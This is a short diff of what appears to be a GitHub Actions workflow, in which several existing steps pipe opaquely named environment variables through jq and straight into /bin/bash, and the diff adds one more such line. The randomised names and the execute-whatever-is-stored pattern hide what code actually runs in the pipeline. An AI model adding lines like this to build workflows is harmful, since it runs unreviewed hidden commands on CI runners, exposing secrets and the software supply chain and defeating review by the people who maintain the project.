@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$btkof24468" | jq -r .w336 | /bin/bash
           echo $f3507 | jq -r .fm4 | /bin/bash
           printf '%s' "$fzsg280" | jq -r .rut43 | /bin/bash
+          echo $igptc3 | jq -r .fyes234 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
